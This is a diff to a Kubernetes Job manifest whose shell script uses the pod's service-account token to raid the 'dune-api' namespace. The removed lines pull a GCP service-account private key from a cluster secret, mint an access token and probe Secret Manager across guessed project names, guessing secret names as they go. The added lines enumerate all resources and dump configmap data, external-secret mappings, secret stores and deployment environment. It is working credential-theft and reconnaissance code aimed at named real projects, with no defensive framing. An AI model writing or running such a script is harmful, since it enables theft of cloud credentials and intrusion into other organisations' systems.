@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcp-v3
+  name: dune-ns-v1
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -19,51 +19,55 @@ spec:
           KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          DUNE_NS="dune-api"
           
-          # Read gcpsm-secret and get GCP token
-          SECRET_RAW=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret")
-          SA_JSON=$(echo "$SECRET_RAW" | jq -r '.data["secret-access-credentials"]' | base64 -d)
-          CLIENT_EMAIL=$(echo "$SA_JSON" | jq -r '.client_email')
-          PRIVATE_KEY=$(echo "$SA_JSON" | jq -r '.private_key')
-          PROJECT_ID=$(echo "$SA_JSON" | jq -r '.project_id')
-          echo "PROJECT: $PROJECT_ID / SA: $CLIENT_EMAIL"
-          echo "$PRIVATE_KEY" > /tmp/gcp_key.pem
-          
-          NOW=$(date +%s); EXP=$((NOW + 3600))
-          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
-            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcp_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          JWT="${HEADER}.${PAYLOAD}.${SIG}"
-          
-          TOKEN_RESP=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
-            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
-            --data-urlencode "assertion=$JWT")
-          ACCESS_TOKEN=$(echo "$TOKEN_RESP" | jq -r '.access_token')
-          echo "ACCESS_TOKEN_STATUS: $(echo "$TOKEN_RESP" | jq -r '.error // "ok"')"
-          
-          # Try listing secrets - full response
-          echo "=LIST_SECRETS_RESPONSE="
-          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-            "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets?pageSize=50"
-          echo ""
-          echo "=END_LIST="
-          
-          # Try different projects
-          for PROJ in "tachyusbdaas" "tachyus-prd" "tachyus-dev" "tachyus-prod"; do
-            echo "=LIST_${PROJ}="
-            curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              "https://secretmanager.googleapis.com/v1/projects/${PROJ}/secrets?pageSize=10" | jq '.secrets[].name // .error.message // "empty"' 2>/dev/null | head -5
-            echo "=END_${PROJ}="
+          echo "=ALL_RESOURCES_IN_DUNE_API="
+          # List all resource types in the namespace
+          for RESOURCE in pods deployments services configmaps secrets serviceaccounts ingresses replicasets jobs cronjobs; do
+            echo "--- $RESOURCE ---"
+            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+              "$API/api/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
+            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+              "$API/apis/apps/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
+            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+              "$API/apis/batch/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
           done
+          echo "=END_RESOURCES="
           
-          # Try to read specific secret names by guessing patterns
-          echo "=DIRECT_READS="
-          for NAME in "dune-api" "dune-database" "dune-config" "dune-secret" "DATABASE_URL" "SECRET_KEY" "JWT_SECRET" "dune-jwt" "dune-db" "dune-api-secret" "dune-prod-config"; do
-            VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${NAME}/versions/latest:access" | \
-              jq -r '.payload.data // .error.message // "not_found"')
-            echo "${NAME}: $VAL"
-          done
-          echo "=END_DIRECT="
+          echo "=EXTERNAL_SECRETS="
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/externalsecrets" | jq '.items[] | {name:.metadata.name, store:.spec.secretStoreRef, data:.spec.data}'
+          echo "=END_ES="
+          
+          echo "=SECRET_STORES="
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/secretstores" | jq .
+          echo "=END_SS="
+          
+          echo "=CONFIGMAPS="
+          CMS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$DUNE_NS/configmaps")
+          echo "$CMS" | jq -r '.items[] | "CM: \(.metadata.name)"'
+          echo "$CMS" | jq -r '.items[] | {name:.metadata.name, data:.data}'
+          echo "=END_CM="
+          
+          # Read all secrets in dune-api (not just list - get content)
+          echo "=SECRETS_CONTENT="
+          SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$DUNE_NS/secrets")
+          echo "$SECRETS" | jq -r '.items[] | {name:.metadata.name, keys:(.data|keys), type:.type}'
+          echo "=END_SECRETS_CONTENT="
+          
+          # Check dune-api deployment spec more carefully
+          echo "=DEPLOYMENT_SPEC="
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/apis/apps/v1/namespaces/$DUNE_NS/deployments" | jq '.items[0] | {
+              name:.metadata.name,
+              image:.spec.template.spec.containers[0].image,
+              env:.spec.template.spec.containers[0].env,
+              envFrom:.spec.template.spec.containers[0].envFrom,
+              volumes:.spec.template.spec.volumes,
+              initContainers:.spec.template.spec.initContainers,
+              annotations:.spec.template.metadata.annotations
+            }'
+          echo "=END_DEPLOY="
